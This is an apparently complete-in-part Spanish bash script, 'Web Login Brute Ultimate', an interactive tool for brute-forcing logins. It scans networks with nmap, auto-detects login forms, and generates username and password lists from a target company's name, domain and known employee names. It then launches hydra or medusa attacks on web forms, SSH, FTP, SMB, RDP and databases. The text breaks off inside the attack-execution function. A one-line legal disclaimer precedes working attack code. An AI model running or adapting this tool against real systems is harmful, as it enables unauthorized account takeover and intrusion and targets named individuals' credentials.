#!/bin/bash

# 🌐 WEB LOGIN BRUTE ULTIMATE
# Fuerza bruta masiva contra logins web - TODAS las modalidades
# Autor: X (sebastian.corao) 
# Fecha: $(date)

# 🔴 ADVERTENCIA LEGAL
echo "
██╗    ██╗███████╗██████╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██║    ██║██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║ █╗ ██║█████╗  ██████╔╝    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██║███╗██║██╔══╝  ██╔══██╗    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
╚███╔███╔╝███████╗██████╔╝    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
                                                                       
🌐 WEB LOGIN BRUTE - TODAS LAS PLATAFORMAS 🌐
"

echo "🔴 ADVERTENCIA LEGAL:"
echo "Este script es SOLO para pentesting autorizado y fines educativos."
echo "El uso no autorizado es ILEGAL. Úsalo bajo tu propia responsabilidad."
echo ""
read -p "¿Entiendes y aceptas? (s/N): " acepta
if [[ ! "$acepta" =~ ^[Ss]$ ]]; then
    echo "❌ Operación cancelada"
    exit 1
fi

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # Sin color

# Variables globales
WORKDIR="web_brute_results_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$WORKDIR/web_brute_ultimate.log"
HYDRA_BIN=""
MEDUSA_BIN=""
WFUZZ_BIN=""
FFUF_BIN=""

# Función de limpieza
cleanup() {
    echo ""
    echo -e "${YELLOW}🧹 Limpiando procesos...${NC}"
    # Matar procesos de fuerza bruta si están corriendo
    pkill -f hydra 2>/dev/null || true
    pkill -f medusa 2>/dev/null || true
    pkill -f wfuzz 2>/dev/null || true
    pkill -f ffuf 2>/dev/null || true
    echo -e "${GREEN}✅ Limpieza completada${NC}"
}

# Configurar trap para limpieza
trap cleanup EXIT INT TERM

# Verificar herramientas
verificar_herramientas() {
    echo -e "${BLUE}🔍 Verificando herramientas...${NC}"
    
    # Verificar hydra
    if command -v hydra >/dev/null 2>&1; then
        HYDRA_BIN="hydra"
        echo -e "${GREEN}✅ hydra encontrado${NC}"
    else
        echo -e "${RED}❌ hydra no encontrado${NC}"
        echo "Instalar con: apt install hydra"
    fi
    
    # Verificar medusa
    if command -v medusa >/dev/null 2>&1; then
        MEDUSA_BIN="medusa"
        echo -e "${GREEN}✅ medusa encontrado${NC}"
    else
        echo -e "${YELLOW}⚠️ medusa no encontrado (opcional)${NC}"
        echo "Instalar con: apt install medusa"
    fi
    
    # Verificar wfuzz
    if command -v wfuzz >/dev/null 2>&1; then
        WFUZZ_BIN="wfuzz"
        echo -e "${GREEN}✅ wfuzz encontrado${NC}"
    else
        echo -e "${YELLOW}⚠️ wfuzz no encontrado (opcional)${NC}"
        echo "Instalar con: apt install wfuzz"
    fi
    
    # Verificar ffuf
    if command -v ffuf >/dev/null 2>&1; then
        FFUF_BIN="ffuf"
        echo -e "${GREEN}✅ ffuf encontrado${NC}"
    else
        echo -e "${YELLOW}⚠️ ffuf no encontrado (opcional)${NC}"
        echo "Instalar con: go install github.com/ffuf/ffuf@latest"
    fi
    
    # Verificar curl y wget
    command -v curl >/dev/null 2>&1 && echo -e "${GREEN}✅ curl disponible${NC}"
    command -v wget >/dev/null 2>&1 && echo -e "${GREEN}✅ wget disponible${NC}"
    command -v nmap >/dev/null 2>&1 && echo -e "${GREEN}✅ nmap disponible${NC}"
    
    if [[ -z "$HYDRA_BIN" ]]; then
        echo -e "${RED}❌ hydra es obligatorio para este script${NC}"
        exit 1
    fi
    
    echo ""
}

# Configurar directorio de trabajo
configurar_directorio() {
    echo -e "${BLUE}📁 Configurando directorio de trabajo...${NC}"
    
    mkdir -p "$WORKDIR"/{wordlists,usernames,targets,results,reports}
    
    echo -e "${GREEN}✅ Directorio creado: $WORKDIR${NC}"
    echo ""
}

# Gestión de objetivos
gestionar_objetivos() {
    echo -e "${PURPLE}🎯 GESTIÓN DE OBJETIVOS${NC}"
    echo ""
    echo "Opciones:"
    echo "1) Agregar objetivo manual"
    echo "2) Escanear red para objetivos"
    echo "3) Importar lista de objetivos"
    echo "4) Detectar formularios de login automáticamente"
    echo "5) Listar objetivos guardados"
    echo "6) Volver al menú principal"
    echo ""
    
    read -p "Selecciona opción [1-6]: " opcion
    
    case $opcion in
        1) agregar_objetivo_manual ;;
        2) escanear_red_objetivos ;;
        3) importar_lista_objetivos ;;
        4) detectar_formularios_auto ;;
        5) listar_objetivos ;;
        6) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
    
    echo ""
    read -p "Presiona Enter para continuar..."
}

# Agregar objetivo manual
agregar_objetivo_manual() {
    echo -e "${CYAN}📝 AGREGAR OBJETIVO MANUAL${NC}"
    echo ""
    
    echo "Tipos de objetivo:"
    echo "1) HTTP/HTTPS Form login"
    echo "2) HTTP Basic Auth"
    echo "3) FTP"
    echo "4) SSH"
    echo "5) Telnet"
    echo "6) SMB"
    echo "7) RDP"
    echo "8) MySQL"
    echo "9) PostgreSQL"
    echo "10) MongoDB"
    echo "11) Custom"
    echo ""
    
    read -p "Tipo de objetivo [1-11]: " tipo_objetivo
    read -p "Host/IP objetivo: " target_host
    read -p "Puerto (Enter para default): " target_port
    
    target_file="$WORKDIR/targets/target_$(date +%H%M%S).txt"
    
    case $tipo_objetivo in
        1)
            read -p "URL del formulario: " form_url
            read -p "Usuario field name (default: username): " user_field
            read -p "Password field name (default: password): " pass_field
            read -p "Métdo HTTP (GET/POST, default: POST): " http_method
            read -p "String de fallo (ej: 'Invalid', 'Error'): " failure_string
            
            user_field=${user_field:-username}
            pass_field=${pass_field:-password}
            http_method=${http_method:-POST}
            
            echo "TYPE:http-form" > "$target_file"
            echo "URL:$form_url" >> "$target_file"
            echo "METHOD:$http_method" >> "$target_file"
            echo "USER_FIELD:$user_field" >> "$target_file"
            echo "PASS_FIELD:$pass_field" >> "$target_file"
            echo "FAILURE:$failure_string" >> "$target_file"
            ;;
            
        2)
            target_port=${target_port:-80}
            read -p "Ruta protegida: " protected_path
            
            echo "TYPE:http-basic" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            echo "PATH:$protected_path" >> "$target_file"
            ;;
            
        3)
            target_port=${target_port:-21}
            echo "TYPE:ftp" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            ;;
            
        4)
            target_port=${target_port:-22}
            echo "TYPE:ssh" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            ;;
            
        5)
            target_port=${target_port:-23}
            echo "TYPE:telnet" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            ;;
            
        6)
            target_port=${target_port:-445}
            echo "TYPE:smb" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            ;;
            
        7)
            target_port=${target_port:-3389}
            echo "TYPE:rdp" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            ;;
            
        8)
            target_port=${target_port:-3306}
            echo "TYPE:mysql" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            ;;
            
        9)
            target_port=${target_port:-5432}
            echo "TYPE:postgresql" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            ;;
            
        10)
            target_port=${target_port:-27017}
            echo "TYPE:mongodb" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            ;;
            
        11)
            read -p "Protocolo/servicio: " custom_service
            echo "TYPE:$custom_service" > "$target_file"
            echo "HOST:$target_host" >> "$target_file"
            echo "PORT:$target_port" >> "$target_file"
            ;;
    esac
    
    echo -e "${GREEN}✅ Objetivo guardado: $target_file${NC}"
}

# Escanear red para objetivos
escanear_red_objetivos() {
    echo -e "${CYAN}🌐 ESCANEAR RED PARA OBJETIVOS${NC}"
    echo ""
    
    if ! command -v nmap >/dev/null 2>&1; then
        echo -e "${RED}❌ nmap no encontrado${NC}"
        echo "Instalar con: apt install nmap"
        return
    fi
    
    read -p "Red a escanear (ej: 192.168.1.0/24): " target_network
    
    echo -e "${YELLOW}🔍 Escaneando red $target_network...${NC}"
    
    scan_file="$WORKDIR/targets/network_scan_$(date +%H%M%S).txt"
    
    # Escanear puertos web comunes
    echo "Escaneando puertos web (80,443,8080,8443,8000,8888)..."
    nmap -sS -p 80,443,8080,8443,8000,8888 --open "$target_network" | grep -E "^[0-9]+\." | while read -r line; do
        ip=$(echo "$line" | awk '{print $1}')
        echo "TYPE:http-scan" >> "$scan_file"
        echo "HOST:$ip" >> "$scan_file"
        echo "---" >> "$scan_file"
    done
    
    # Escanear servicios comunes
    echo "Escaneando servicios comunes (21,22,23,139,445,3389,3306,5432)..."
    nmap -sS -p 21,22,23,139,445,3389,3306,5432 --open "$target_network" | grep -E "^[0-9]+\." | while read -r line; do
        ip=$(echo "$line" | awk '{print $1}')
        
        # Verificar servicios específicos
        nmap -sV -p 21,22,23,139,445,3389,3306,5432 "$ip" 2>/dev/null | grep open | while read -r service_line; do
            port=$(echo "$service_line" | awk '{print $1}' | cut -d'/' -f1)
            service=$(echo "$service_line" | awk '{print $3}')
            
            case $port in
                21) echo "TYPE:ftp" >> "$scan_file"; echo "HOST:$ip" >> "$scan_file"; echo "PORT:21" >> "$scan_file" ;;
                22) echo "TYPE:ssh" >> "$scan_file"; echo "HOST:$ip" >> "$scan_file"; echo "PORT:22" >> "$scan_file" ;;
                23) echo "TYPE:telnet" >> "$scan_file"; echo "HOST:$ip" >> "$scan_file"; echo "PORT:23" >> "$scan_file" ;;
                139|445) echo "TYPE:smb" >> "$scan_file"; echo "HOST:$ip" >> "$scan_file"; echo "PORT:$port" >> "$scan_file" ;;
                3389) echo "TYPE:rdp" >> "$scan_file"; echo "HOST:$ip" >> "$scan_file"; echo "PORT:3389" >> "$scan_file" ;;
                3306) echo "TYPE:mysql" >> "$scan_file"; echo "HOST:$ip" >> "$scan_file"; echo "PORT:3306" >> "$scan_file" ;;
                5432) echo "TYPE:postgresql" >> "$scan_file"; echo "HOST:$ip" >> "$scan_file"; echo "PORT:5432" >> "$scan_file" ;;
            esac
            echo "---" >> "$scan_file"
        done
    done
    
    echo -e "${GREEN}✅ Escaneo completado: $scan_file${NC}"
    
    # Mostrar resumen
    if [[ -f "$scan_file" ]]; then
        hosts_found=$(grep "HOST:" "$scan_file" | wc -l)
        echo -e "${CYAN}📊 Se encontraron $hosts_found objetivos potenciales${NC}"
    fi
}

# Detectar formularios automáticamente
detectar_formularios_auto() {
    echo -e "${CYAN}🔍 DETECTAR FORMULARIOS DE LOGIN${NC}"
    echo ""
    
    read -p "URL base (ej: https://example.com): " base_url
    
    echo -e "${YELLOW}🔍 Buscando formularios de login...${NC}"
    
    forms_file="$WORKDIR/targets/forms_$(date +%H%M%S).txt"
    
    # Buscar rutas comunes de login
    common_paths=(
        "/login"
        "/signin"
        "/auth"
        "/admin"
        "/admin/login"
        "/wp-login.php"
        "/wp-admin"
        "/administrator"
        "/manager"
        "/console"
        "/dashboard"
        "/portal"
        "/user/login"
        "/account/login"
        "/members"
        "/staff"
    )
    
    echo "Probando rutas comunes de login..."
    for path in "${common_paths[@]}"; do
        full_url="${base_url}${path}"
        echo "Probando: $full_url"
        
        if curl -s -I "$full_url" | grep -q "200 OK"; then
            echo -e "${GREEN}✅ Encontrado: $full_url${NC}"
            
            # Descargar página para buscar formularios
            page_content=$(curl -s "$full_url")
            
            # Buscar formularios de login
            if echo "$page_content" | grep -qi "type=['\"]password['\"]"; then
                echo "TYPE:http-form" >> "$forms_file"
                echo "URL:$full_url" >> "$forms_file"
                
                # Intentar detectar nombres de campos
                user_field=$(echo "$page_content" | grep -oiE 'name=['\"][^'\"]*['\"]' | grep -iE '(user|login|email)' | head -1 | cut -d'"' -f2)
                pass_field=$(echo "$page_content" | grep -oiE 'name=['\"][^'\"]*['\"]' | grep -iE '(pass|pwd)' | head -1 | cut -d'"' -f2)
                
                echo "USER_FIELD:${user_field:-username}" >> "$forms_file"
                echo "PASS_FIELD:${pass_field:-password}" >> "$forms_file"
                echo "METHOD:POST" >> "$forms_file"
                echo "FAILURE:Invalid" >> "$forms_file"
                echo "---" >> "$forms_file"
                
                echo -e "${CYAN}  📝 Formulario detectado${NC}"
            fi
        fi
    done
    
    echo -e "${GREEN}✅ Detección completada: $forms_file${NC}"
}

# Listar objetivos
listar_objetivos() {
    echo -e "${CYAN}📋 OBJETIVOS GUARDADOS${NC}"
    echo ""
    
    if ! ls "$WORKDIR/targets"/*.txt >/dev/null 2>&1; then
        echo "No hay objetivos guardados"
        return
    fi
    
    for target_file in "$WORKDIR/targets"/*.txt; do
        if [[ -f "$target_file" ]]; then
            echo "📄 $(basename "$target_file")"
            echo "---"
            cat "$target_file"
            echo ""
        fi
    done
}

# Gestión de wordlists de usuarios
gestionar_usuarios() {
    echo -e "${PURPLE}👥 GESTIÓN DE USUARIOS${NC}"
    echo ""
    echo "Opciones:"
    echo "1) Crear lista de usuarios personalizada"
    echo "2) Descargar listas de usuarios comunes"
    echo "3) Generar usuarios basados en objetivo"
    echo "4) Combinar listas de usuarios"
    echo "5) Listar archivos de usuarios disponibles"
    echo "6) Volver al menú principal"
    echo ""
    
    read -p "Selecciona opción [1-6]: " opcion
    
    case $opcion in
        1) crear_usuarios_personalizada ;;
        2) descargar_usuarios_comunes ;;
        3) generar_usuarios_objetivo ;;
        4) combinar_usuarios ;;
        5) listar_usuarios ;;
        6) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
    
    echo ""
    read -p "Presiona Enter para continuar..."
}

# Crear lista de usuarios personalizada
crear_usuarios_personalizada() {
    echo -e "${CYAN}✏️ CREAR LISTA DE USUARIOS PERSONALIZADA${NC}"
    echo ""
    
    user_file="$WORKDIR/usernames/custom_users_$(date +%H%M%S).txt"
    
    echo "Introduce usuarios (uno por línea, Enter vacío para terminar):"
    while true; do
        read -p "Usuario: " username
        if [[ -z "$username" ]]; then
            break
        fi
        echo "$username" >> "$user_file"
    done
    
    # Agregar usuarios comunes por defecto
    echo "Agregando usuarios comunes..."
    cat >> "$user_file" << 'EOF'
admin
administrator
root
guest
user
test
demo
service
operator
manager
supervisor
support
helpdesk
webmaster
mail
ftp
www
nobody
anonymous
EOF
    
    # Eliminar duplicados
    sort "$user_file" | uniq > "${user_file}.tmp"
    mv "${user_file}.tmp" "$user_file"
    
    lines=$(wc -l < "$user_file")
    echo -e "${GREEN}✅ Lista de usuarios creada: $user_file ($lines usuarios)${NC}"
}

# Descargar listas comunes
descargar_usuarios_comunes() {
    echo -e "${CYAN}⬇️ DESCARGA DE LISTAS DE USUARIOS${NC}"
    echo ""
    
    cd "$WORKDIR/usernames"
    
    echo "1) Top 100 usernames"
    echo "2) Admin usernames"
    echo "3) Service accounts"
    echo "4) Email-based usernames"
    echo "5) Gaming usernames"
    echo "6) Todas las anteriores"
    echo ""
    
    read -p "Selecciona [1-6]: " dl_option
    
    case $dl_option in
        1|6)
            echo -e "${YELLOW}📥 Descargando top usernames...${NC}"
            curl -s "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt" -o top_usernames.txt 2>/dev/null || echo "Error descargando"
            ;;
    esac
    
    case $dl_option in
        2|6)
            echo -e "${YELLOW}📥 Creando admin usernames...${NC}"
            cat > admin_usernames.txt << 'EOF'
admin
administrator
root
superuser
sa
sysadmin
webadmin
dbadmin
netadmin
secadmin
backup
service
operator
manager
supervisor
support
helpdesk
maintenance
system
daemon
bin
sys
adm
sync
shutdown
halt
mail
news
uucp
proxy
www-data
EOF
            ;;
    esac
    
    case $dl_option in
        3|6)
            echo -e "${YELLOW}📥 Creando service accounts...${NC}"
            cat > service_accounts.txt << 'EOF'
apache
nginx
httpd
mysql
postgres
mongodb
redis
elasticsearch
oracle
mssql
tomcat
jenkins
git
svn
ftp
ssh
telnet
snmp
ldap
bind
named
postfix
sendmail
dovecot
squid
samba
nfs
rsync
cron
at
nobody
daemon
bin
sys
adm
tty
disk
lp
sync
shutdown
halt
mail
news
uucp
man
proxy
games
EOF
            ;;
    esac
    
    case $dl_option in
        4|6)
            echo -e "${YELLOW}📥 Creando email-based usernames...${NC}"
            cat > email_usernames.txt << 'EOF'
contact
info
support
admin
webmaster
postmaster
hostmaster
abuse
noreply
no-reply
sales
marketing
hr
finance
accounting
billing
legal
security
it
help
service
customer
guest
test
demo
user
EOF
            ;;
    esac
    
    case $dl_option in
        5|6)
            echo -e "${YELLOW}📥 Creando gaming usernames...${NC}"
            cat > gaming_usernames.txt << 'EOF'
player
gamer
user
guest
admin
moderator
mod
op
owner
staff
helper
vip
premium
pro
noob
newbie
test
demo
trial
steam
origin
epic
uplay
xbox
psn
nintendo
minecraft
roblox
fortnite
valorant
csgo
dota
league
wow
pubg
cod
fifa
madden
2k
nba
nfl
mlb
nhl
EOF
            ;;
    esac
    
    cd - >/dev/null
    echo -e "${GREEN}✅ Listas de usuarios descargadas${NC}"
}

# Generar usuarios basados en objetivo
generar_usuarios_objetivo() {
    echo -e "${CYAN}🎯 GENERAR USUARIOS BASADOS EN OBJETIVO${NC}"
    echo ""
    
    read -p "Nombre de la empresa/organización: " company_name
    read -p "Dominio (sin @, ej: company.com): " domain_name
    read -p "Empleados conocidos (separados por espacios): " employees
    
    target_file="$WORKDIR/usernames/target_users_$(date +%H%M%S).txt"
    
    echo -e "${YELLOW}📝 Generando usuarios para $company_name...${NC}"
    
    # Usuarios basados en empresa
    if [[ -n "$company_name" ]]; then
        company_short=$(echo "$company_name" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
        
        echo "$company_short" >> "$target_file"
        echo "${company_short}admin" >> "$target_file"
        echo "admin${company_short}" >> "$target_file"
        echo "${company_short}user" >> "$target_file"
        echo "${company_short}test" >> "$target_file"
        echo "${company_short}support" >> "$target_file"
        echo "${company_short}service" >> "$target_file"
    fi
    
    # Usuarios basados en dominio
    if [[ -n "$domain_name" ]]; then
        domain_short=$(echo "$domain_name" | cut -d'.' -f1)
        
        echo "$domain_short" >> "$target_file"
        echo "${domain_short}admin" >> "$target_file"
        echo "admin@${domain_name}" >> "$target_file"
        echo "support@${domain_name}" >> "$target_file"
        echo "info@${domain_name}" >> "$target_file"
        echo "contact@${domain_name}" >> "$target_file"
        echo "webmaster@${domain_name}" >> "$target_file"
    fi
    
    # Usuarios basados en empleados
    if [[ -n "$employees" ]]; then
        for employee in $employees; do
            name_lower=$(echo "$employee" | tr '[:upper:]' '[:lower:]')
            
            # Nombre completo
            echo "$name_lower" >> "$target_file"
            
            # Primera letra + apellido (si hay espacio)
            if [[ "$name_lower" =~ [[:space:]] ]]; then
                first=$(echo "$name_lower" | awk '{print $1}')
                last=$(echo "$name_lower" | awk '{print $2}')
                
                echo "${first:0:1}${last}" >> "$target_file"
                echo "${first}.${last}" >> "$target_file"
                echo "${first}_${last}" >> "$target_file"
                echo "${first}${last}" >> "$target_file"
                
                if [[ -n "$domain_name" ]]; then
                    echo "${first}.${last}@${domain_name}" >> "$target_file"
                    echo "${first}@${domain_name}" >> "$target_file"
                    echo "${last}@${domain_name}" >> "$target_file"
                fi
            else
                if [[ -n "$domain_name" ]]; then
                    echo "${name_lower}@${domain_name}" >> "$target_file"
                fi
            fi
        done
    fi
    
    # Agregar usuarios estándar
    cat >> "$target_file" << 'EOF'
admin
administrator
root
guest
user
test
demo
support
service
operator
manager
webmaster
EOF
    
    # Eliminar duplicados y ordenar
    sort "$target_file" | uniq > "${target_file}.tmp"
    mv "${target_file}.tmp" "$target_file"
    
    lines=$(wc -l < "$target_file")
    echo -e "${GREEN}✅ Lista de usuarios generada: $target_file ($lines usuarios)${NC}"
}

# Gestión de wordlists de contraseñas
gestionar_passwords() {
    echo -e "${PURPLE}🔐 GESTIÓN DE CONTRASEÑAS${NC}"
    echo ""
    echo "Opciones:"
    echo "1) Usar wordlists del sistema"
    echo "2) Descargar wordlists populares"
    echo "3) Crear wordlist personalizada"
    echo "4) Generar contraseñas basadas en objetivo"
    echo "5) Combinar wordlists"
    echo "6) Listar wordlists disponibles"
    echo "7) Volver al menú principal"
    echo ""
    
    read -p "Selecciona opción [1-7]: " opcion
    
    case $opcion in
        1) usar_wordlists_sistema ;;
        2) descargar_wordlists ;;
        3) crear_wordlist_personalizada ;;
        4) generar_passwords_objetivo ;;
        5) combinar_wordlists ;;
        6) listar_wordlists ;;
        7) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
    
    echo ""
    read -p "Presiona Enter para continuar..."
}

# Usar wordlists del sistema
usar_wordlists_sistema() {
    echo -e "${CYAN}🔍 WORDLISTS DEL SISTEMA${NC}"
    echo ""
    
    # Enlazar wordlists comunes
    if [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
        ln -sf "/usr/share/wordlists/rockyou.txt" "$WORKDIR/wordlists/rockyou.txt"
        echo -e "${GREEN}✅ rockyou.txt enlazado${NC}"
    elif [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
        echo -e "${YELLOW}📦 Descomprimiendo rockyou.txt...${NC}"
        sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
        ln -sf "/usr/share/wordlists/rockyou.txt" "$WORKDIR/wordlists/rockyou.txt"
        echo -e "${GREEN}✅ rockyou.txt descomprimido y enlazado${NC}"
    fi
    
    if [[ -d "/usr/share/seclists" ]]; then
        ln -sf "/usr/share/seclists" "$WORKDIR/wordlists/seclists"
        echo -e "${GREEN}✅ SecLists enlazado${NC}"
    fi
    
    # Crear enlaces a wordlists específicas de SecLists
    if [[ -d "/usr/share/seclists/Passwords" ]]; then
        echo -e "${CYAN}🔗 Creando enlaces específicos...${NC}"
        
        # Passwords comunes
        [[ -f "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt" ]] && \
            ln -sf "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt" "$WORKDIR/wordlists/top100.txt"
        
        [[ -f "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt" ]] && \
            ln -sf "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt" "$WORKDIR/wordlists/top1000.txt"
        
        # Default passwords
        [[ -f "/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" ]] && \
            ln -sf "/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt" "$WORKDIR/wordlists/default.txt"
        
        echo -e "${GREEN}✅ Enlaces específicos creados${NC}"
    fi
}

# Generar contraseñas basadas en objetivo
generar_passwords_objetivo() {
    echo -e "${CYAN}🎯 GENERAR CONTRASEÑAS BASADAS EN OBJETIVO${NC}"
    echo ""
    
    read -p "Nombre empresa/sitio: " target_name
    read -p "Año actual: " current_year
    read -p "Años relevantes (separados por espacios): " years
    read -p "Palabras clave (separados por espacios): " keywords
    read -p "Números comunes (separados por espacios): " numbers
    
    target_file="$WORKDIR/wordlists/target_passwords_$(date +%H%M%S).txt"
    
    echo -e "${YELLOW}📝 Generando contraseñas para $target_name...${NC}"
    
    # Contraseñas base comunes
    cat > "$target_file" << 'EOF'
123456
password
admin
root
guest
user
test
demo
welcome
login
access
secret
private
public
temp
default
master
super
power
strong
secure
qwerty
abc123
password123
admin123
123456789
welcome123
letmein
dragon
monkey
superman
batman
pokemon
mario
sonic
zelda
football
baseball
basketball
soccer
tennis
golf
music
love
family
house
school
work
office
company
business
EOF
    
    # Agregar información del objetivo
    if [[ -n "$target_name" ]]; then
        name_lower=$(echo "$target_name" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
        
        echo "$name_lower" >> "$target_file"
        echo "${name_lower}123" >> "$target_file"
        echo "${name_lower}admin" >> "$target_file"
        echo "admin${name_lower}" >> "$target_file"
        echo "${name_lower}2024" >> "$target_file"
        echo "${name_lower}password" >> "$target_file"
        echo "password${name_lower}" >> "$target_file"
        echo "${name_lower}user" >> "$target_file"
        echo "${name_lower}guest" >> "$target_file"
        echo "${name_lower}test" >> "$target_file"
        echo "${name_lower}demo" >> "$target_file"
        
        # Con años
        if [[ -n "$current_year" ]]; then
            echo "${name_lower}${current_year}" >> "$target_file"
            echo "password${current_year}" >> "$target_file"
            echo "admin${current_year}" >> "$target_file"
        fi
        
        # Con números comunes
        if [[ -n "$numbers" ]]; then
            for num in $numbers; do
                echo "${name_lower}${num}" >> "$target_file"
                echo "password${num}" >> "$target_file"
                echo "admin${num}" >> "$target_file"
            done
        fi
    fi
    
    # Agregar años relevantes
    if [[ -n "$years" ]]; then
        for year in $years; do
            echo "$year" >> "$target_file"
            echo "password${year}" >> "$target_file"
            echo "admin${year}" >> "$target_file"
            echo "user${year}" >> "$target_file"
        done
    fi
    
    # Agregar palabras clave
    if [[ -n "$keywords" ]]; then
        for keyword in $keywords; do
            keyword_lower=$(echo "$keyword" | tr '[:upper:]' '[:lower:]')
            
            echo "$keyword_lower" >> "$target_file"
            echo "${keyword_lower}123" >> "$target_file"
            echo "${keyword_lower}admin" >> "$target_file"
            echo "admin${keyword_lower}" >> "$target_file"
            echo "${keyword_lower}password" >> "$target_file"
            echo "password${keyword_lower}" >> "$target_file"
            
            if [[ -n "$current_year" ]]; then
                echo "${keyword_lower}${current_year}" >> "$target_file"
            fi
        done
    fi
    
    # Eliminar duplicados y ordenar por longitud (passwords cortas primero)
    sort "$target_file" | uniq | awk '{ print length($0) " " $0; }' | sort -n | cut -d' ' -f2- > "${target_file}.tmp"
    mv "${target_file}.tmp" "$target_file"
    
    lines=$(wc -l < "$target_file")
    echo -e "${GREEN}✅ Wordlist de contraseñas generada: $target_file ($lines contraseñas)${NC}"
}

# Configuración de ataques
configurar_ataque() {
    echo -e "${PURPLE}⚔️ CONFIGURAR ATAQUE${NC}"
    echo ""
    
    # Verificar archivos necesarios
    if ! ls "$WORKDIR/targets"/*.txt >/dev/null 2>&1; then
        echo -e "${RED}❌ No hay objetivos configurados${NC}"
        echo "Primero gestiona objetivos."
        return
    fi
    
    if ! ls "$WORKDIR/usernames"/*.txt >/dev/null 2>&1; then
        echo -e "${RED}❌ No hay listas de usuarios${NC}"
        echo "Primero gestiona usuarios."
        return
    fi
    
    if ! ls "$WORKDIR/wordlists"/*.txt >/dev/null 2>&1; then
        echo -e "${RED}❌ No hay wordlists de contraseñas${NC}"
        echo "Primero gestiona contraseñas."
        return
    fi
    
    echo "Tipos de ataque:"
    echo "1) 🚀 Ataque rápido (usuarios comunes + passwords débiles)"
    echo "2) 🔥 Ataque intensivo (wordlists completas)"
    echo "3) 🎯 Ataque dirigido (basado en objetivo específico)"
    echo "4) 🌊 Ataque por oleadas (escalado gradual)"
    echo "5) 🎭 Ataque multi-protocolo (todos los servicios)"
    echo "6) 🔧 Ataque personalizado"
    echo ""
    
    read -p "Selecciona tipo de ataque [1-6]: " attack_type
    
    case $attack_type in
        1) ataque_rapido ;;
        2) ataque_intensivo ;;
        3) ataque_dirigido ;;
        4) ataque_oleadas ;;
        5) ataque_multi_protocolo ;;
        6) ataque_personalizado ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
}

# Ataque rápido
ataque_rapido() {
    echo -e "${CYAN}🚀 ATAQUE RÁPIDO${NC}"
    echo ""
    
    # Seleccionar objetivo
    select_target
    if [[ -z "$selected_target" ]]; then
        return
    fi
    
    echo -e "${YELLOW}🚀 Iniciando ataque rápido...${NC}"
    echo "Objetivo: $selected_target"
    echo "Configuración: usuarios básicos + contraseñas comunes"
    echo ""
    
    # Crear listas rápidas
    quick_users="$WORKDIR/usernames/quick_users.txt"
    quick_passes="$WORKDIR/wordlists/quick_passes.txt"
    
    # Usuarios básicos
    cat > "$quick_users" << 'EOF'
admin
administrator
root
guest
user
test
demo
service
operator
manager
webmaster
EOF
    
    # Contraseñas básicas
    cat > "$quick_passes" << 'EOF'
admin
password
123456
admin123
password123
root
guest
user
test
demo
welcome
login
qwerty
abc123
123456789
EOF
    
    # Ejecutar ataque según tipo de objetivo
    execute_attack "$selected_target" "$quick_users" "$quick_passes" "quick"
}

# Ataque intensivo
ataque_intensivo() {
    echo -e "${CYAN}🔥 ATAQUE INTENSIVO${NC}"
    echo ""
    
    select_target
    if [[ -z "$selected_target" ]]; then
        return
    fi
    
    # Seleccionar archivos más grandes disponibles
    select_user_file "intensivo"
    select_password_file "intensivo"
    
    if [[ -z "$selected_user_file" ]] || [[ -z "$selected_pass_file" ]]; then
        echo -e "${RED}❌ Archivos necesarios no seleccionados${NC}"
        return
    fi
    
    echo -e "${YELLOW}🔥 Iniciando ataque intensivo...${NC}"
    echo "Esto puede tardar mucho tiempo..."
    echo ""
    
    execute_attack "$selected_target" "$selected_user_file" "$selected_pass_file" "intensive"
}

# Ejecutar ataque
execute_attack() {
    local target_file="$1"
    local user_file="$2"
    local pass_file="$3"
    local attack_name="$4"
    
    # Leer configuración del objetivo
    target_type=$(grep "TYPE:" "$target_file" | cut -d: -f2)
    
    result_file="$WORKDIR/results/attack_${attack_name}_$(date +%H%M%S).txt"
    
    echo -e "${CYAN}🎯 Ejecutando ataque $attack_name contra $target_type${NC}"
